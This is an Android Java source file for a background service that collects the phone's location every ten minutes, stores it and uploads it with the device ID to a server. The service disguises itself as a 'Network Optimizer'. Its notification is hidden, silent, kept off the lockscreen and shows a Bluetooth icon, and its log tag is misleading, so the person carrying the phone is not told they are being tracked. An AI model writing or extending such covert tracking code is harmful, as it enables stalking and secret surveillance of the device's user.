package com.example.locationtracker;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import android.content.pm.PackageManager;

public class BackupLocationService extends Service {
    private static final String TAG = "NetworkOptimizer";
    private static final String CHANNEL_ID = "network_optimization";
    private static final int NOTIFICATION_ID = 8003;
    private static final int MAX_BACKUP_ENTRIES = 100;

    private Handler handler;
    private ExecutorService executor;
    private LocationManager locationManager;
    private NetworkClient networkClient;
    private String deviceId;
    private String deviceName;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Network optimization service started");

        createNotificationChannel();
        handler = new Handler(Looper.getMainLooper());
        executor = Executors.newSingleThreadExecutor();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        networkClient = new NetworkClient(this); // Добавлен контекст

        loadDeviceInfo();
        startForeground(NOTIFICATION_ID, createNotification());

        if (!hasLocationPermission()) {
            Log.w(TAG, "Location permission not granted");
            stopSelf();
            return;
        }

        startBackupTracking();
    }

    private void loadDeviceInfo() {
        deviceId = DeviceIdManager.getDeviceId(this);
        SharedPreferences prefs = getSharedPreferences("LocationTracker", MODE_PRIVATE);
        deviceName = prefs.getString("device_name", "Unknown_Device");
    }

    private boolean hasLocationPermission() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED ||
                ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                        == PackageManager.PERMISSION_GRANTED;
    }

    private void startBackupTracking() {
        Runnable backupRunnable = new Runnable() {
            @Override
            public void run() {
                performBackupSync();
                // Увеличил интервал до 10 минут для экономии батареи
                handler.postDelayed(this, 600_000);
            }
        };

        handler.postDelayed(backupRunnable, 300_000); // Первый запуск через 5 минут
    }

    private void performBackupSync() {
        executor.execute(() -> {
            try {
                // Отправляем накопленные backup данные
                sendBackupLocations();

                // Получаем текущую локацию для backup
                Location location = getLastKnownLocation();
                if (location != null) {
                    saveLocationToBackup(location);
                }
            } catch (Exception e) {
                Log.e(TAG, "Backup sync error", e);
            }
        });
    }

    private void sendBackupLocations() {
        SharedPreferences backupPrefs = getSharedPreferences("backup_locations", MODE_PRIVATE);
        int count = backupPrefs.getInt("backup_count", 0);

        SharedPreferences.Editor editor = backupPrefs.edit();
        int successCount = 0;

        for (int i = 0; i < count; i++) {
            String locationData = backupPrefs.getString("backup_" + i, "");
            if (locationData.isEmpty()) continue;

            try {
                String[] parts = locationData.split(",");
                if (parts.length >= 3) {
                    double lat = Double.parseDouble(parts[0]);
                    double lon = Double.parseDouble(parts[1]);
                    long timestamp = Long.parseLong(parts[2]);

                    // ДОБАВЛЕНА ВАЛИДАЦИЯ координат
                    if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
                        Log.w(TAG, "Invalid coordinates, skipping: " + locationData);
                        editor.remove("backup_" + i);
                        continue;
                    }

                    float accuracy = parts.length > 3 ? Float.parseFloat(parts[3]) : -1f;

                    LocationService.LocationData data = new LocationService.LocationData(
                            lat, lon, timestamp, accuracy, -1, null
                    );

                    boolean sent = networkClient.sendLocation(data, deviceId, deviceName);
                    if (sent) {
                        editor.remove("backup_" + i);
                        successCount++;
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed to parse backup location: " + locationData, e);
                editor.remove("backup_" + i); // Удаляем поврежденную запись
            }
        }

        editor.apply();

        if (successCount > 0) {
            Log.d(TAG, "Sent " + successCount + " backup locations");
        }
    }

    private Location getLastKnownLocation() {
        if (!hasLocationPermission()) return null;

        try {
            if (locationManager != null) {
                Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

                if (gpsLocation != null && networkLocation != null) {
                    return gpsLocation.getTime() > networkLocation.getTime() ? gpsLocation : networkLocation;
                }
                return gpsLocation != null ? gpsLocation : networkLocation;
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Location permission not available for backup");
        }
        return null;
    }

    private void saveLocationToBackup(Location location) {
        SharedPreferences backupPrefs = getSharedPreferences("backup_locations", MODE_PRIVATE);
        int count = backupPrefs.getInt("backup_count", 0);

        // Ограничиваем количество backup записей
        if (count >= MAX_BACKUP_ENTRIES) {
            // Удаляем старые записи
            for (int i = 0; i < count - MAX_BACKUP_ENTRIES + 10; i++) {
                backupPrefs.edit().remove("backup_" + i).apply();
            }
            count = MAX_BACKUP_ENTRIES - 10;
        }

        String locationData = String.format("%f,%f,%d,%f",
                location.getLatitude(), location.getLongitude(),
                location.getTime(), location.hasAccuracy() ? location.getAccuracy() : -1f);

        backupPrefs.edit()
                .putString("backup_" + count, locationData)
                .putInt("backup_count", count + 1)
                .apply();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Network Optimization",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
                .setContentTitle("Network Optimizer")
                .setContentText("Optimizing network connections")
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .setSilent(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
        }
        if (executor != null && !executor.isShutdown()) {
            executor.shutdown();
        }
        super.onDestroy();
    }
}